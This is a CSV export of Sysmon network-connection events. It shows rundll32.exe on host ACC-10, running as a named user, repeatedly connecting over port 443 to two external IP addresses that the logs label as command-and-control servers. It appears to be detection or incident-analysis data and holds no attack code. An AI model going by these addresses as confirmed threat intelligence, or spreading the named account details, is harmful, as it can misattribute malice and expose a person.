2022-08-05 22:50:43+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51051,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:50:43.203971600Z""/>     <EventRecordID>149079</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:50:36.954</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51051</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:51:23+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51134,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:51:23.623013100Z""/>     <EventRecordID>149330</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:51:18.104</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51134</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:51:25+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51135,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:51:25.123163100Z""/>     <EventRecordID>149331</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:51:19.073</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51135</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:52:09+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51141,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:52:09.471597500Z""/>     <EventRecordID>149496</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:52:04.005</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51141</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:52:14+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51185,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:52:14.344084700Z""/>     <EventRecordID>149548</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:52:08.779</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51185</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:53:00+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51190,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:53:00.074657300Z""/>     <EventRecordID>149614</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:52:54.063</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51190</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:53:00+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51191,c-73-245-147-162.hsd1.fl.comcast.net,73.245.147.162,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:53:00.074657300Z""/>     <EventRecordID>149615</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:52:54.119</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51191</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">73.245.147.162</Data>     <Data Name=""DestinationHostname"">c-73-245-147-162.hsd1.fl.comcast.net</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:53:56+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51208,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:53:56.300096800Z""/>     <EventRecordID>149732</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:53:50.806</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51208</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
2022-08-05 22:53:58+00:00,ACC-10,evtx_Microsoft-Windows-Sysmon/Operational,Command and Control,Connection to C2,0.0,Microsoft-Windows-Sysmon/Operational;Microsoft-Windows-Sysmon;3,3,364,C:\Windows\SysWOW64\rundll32.exe,,,,,tcp,true,ACC-10.corp.net,172.17.11.184,51209,5-131.gtt-net.cz,82.144.131.5,443,-,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">   <System>     <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>     <EventID>3</EventID>     <Version>5</Version>     <Level>4</Level>     <Task>3</Task>     <Opcode>0</Opcode>     <Keywords>0x8000000000000000</Keywords>     <TimeCreated SystemTime=""2022-08-05T22:53:58.106919800Z""/>     <EventRecordID>149733</EventRecordID>     <Correlation/>     <Execution ProcessID=""1428"" ThreadID=""1928""/>     <Channel>Microsoft-Windows-Sysmon/Operational</Channel>     <Computer>ACC-10.corp.net</Computer>     <Security UserID=""S-1-5-18""/>   </System>   <EventData>     <Data Name=""RuleName""/>     <Data Name=""UtcTime"">2022-08-05 22:53:50.864</Data>     <Data Name=""ProcessGuid"">{140A6FA9-8EDF-62ED-0000-0010D81B7D01}</Data>     <Data Name=""ProcessId"">364</Data>     <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>     <Data Name=""User"">CORP\Joann.Sims</Data>     <Data Name=""Protocol"">tcp</Data>     <Data Name=""Initiated"">true</Data>     <Data Name=""SourceIsIpv6"">false</Data>     <Data Name=""SourceIp"">172.17.11.184</Data>     <Data Name=""SourceHostname"">ACC-10.corp.net</Data>     <Data Name=""SourcePort"">51209</Data>     <Data Name=""SourcePortName""/>     <Data Name=""DestinationIsIpv6"">false</Data>     <Data Name=""DestinationIp"">82.144.131.5</Data>     <Data Name=""DestinationHostname"">5-131.gtt-net.cz</Data>     <Data Name=""DestinationPort"">443</Data>     <Data Name=""DestinationPortName"">https</Data>   </EventData> </Event> "
